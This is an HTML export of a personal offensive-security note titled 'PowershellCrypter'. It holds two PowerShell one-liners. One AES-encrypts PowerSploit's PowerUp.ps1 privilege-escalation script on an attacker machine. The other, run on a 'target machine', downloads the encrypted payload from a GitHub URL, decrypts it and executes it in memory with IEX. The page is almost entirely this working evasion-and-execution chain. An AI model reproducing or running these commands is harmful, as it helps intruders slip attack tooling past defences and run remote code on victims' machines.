<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PowershellCrypter (my version)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>PowershellCrypter (my version)</h1><br />Github: <a
      href="https://github.com/DenFox93/PowershellCrypter" target="_blank">https://github.com/DenFox93/PowershellCrypter</a><br />In the
    Project is possible to find also the NOT-one-liners scripts, that at the first approach are more understandable
    <br /><br />1. encrypt from the Attacker machine<br />
    <div class="codebox">
      <div class="codebox">
        $unencryptedString&nbsp;=&nbsp;(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&nbsp;&#39;);$aes&nbsp;=&nbsp;New-Object&nbsp;&quot;System.Security.Cryptography.AesManaged&quot;;$aes.Mode&nbsp;=&nbsp;[System.Security.Cryptography.CipherMode]::CBC;$aes.Padding&nbsp;=&nbsp;[System.Security.Cryptography.PaddingMode]::Zeros;$aes.BlockSize&nbsp;=&nbsp;128;$aes.KeySize&nbsp;=&nbsp;256;$aes.GenerateKey();$key=[System.Convert]::ToBase64String($aes.Key);$key;$bytes&nbsp;=&nbsp;[System.Text.Encoding]::UTF8.GetBytes($unencryptedString);$encryptor&nbsp;=&nbsp;$aes.CreateEncryptor();$encryptedData&nbsp;=&nbsp;$encryptor.TransformFinalBlock($bytes,&nbsp;0,&nbsp;$bytes.Length);[byte[]]&nbsp;$fullData&nbsp;=&nbsp;$aes.IV&nbsp;+&nbsp;$encryptedData;$aes.Dispose();$encryptedString&nbsp;=&nbsp;[System.Convert]::ToBase64String($fullData);[System.IO.File]::WriteAllText<span
          style="color:#000000;font-weight:400">(</span>&quot;$env:userprofile\desktop\file&quot;,$key+$encryptedString<span
          style="color:#000000;font-weight:400">)</span></div>
    </div><br /><br />2. Upload somewhere the “file” encrypted <br /><br />3. decrypt from the Target machine<br />
    <div class="codebox">
      <div class="codebox">
        $file=(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/DenFox93/PowershellCrypter/main/examples/file1&#39;);$key=$file.substring(0,44);$bytes=[System.Convert]::FromBase64String($file.substring(44));$IV&nbsp;=&nbsp;$bytes[0..15];$aes&nbsp;=&nbsp;New-Object&nbsp;&quot;System.Security.Cryptography.AesManaged&quot;;$aes.Mode&nbsp;=&nbsp;[System.Security.Cryptography.CipherMode]::CBC;$aes.Padding&nbsp;=&nbsp;[System.Security.Cryptography.PaddingMode]::Zeros;$aes.BlockSize&nbsp;=&nbsp;128;$aes.KeySize&nbsp;=&nbsp;256;$aes.IV&nbsp;=&nbsp;$IV;$aes.Key&nbsp;=&nbsp;[System.Convert]::FromBase64String($key);$decryptor&nbsp;=&nbsp;$aes.CreateDecryptor();$unencryptedData&nbsp;=&nbsp;$decryptor.TransformFinalBlock($bytes,&nbsp;16,&nbsp;$bytes.Length&nbsp;-&nbsp;16);$aes.Dispose();$backToPlainText=[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0);&nbsp;IEX($backToPlainText);
      </div>
    </div><br /> In this example &quot;file1&quot; is the file “PowerUp.ps1” encrypted<br /><br />
  </div>
</body>

</html>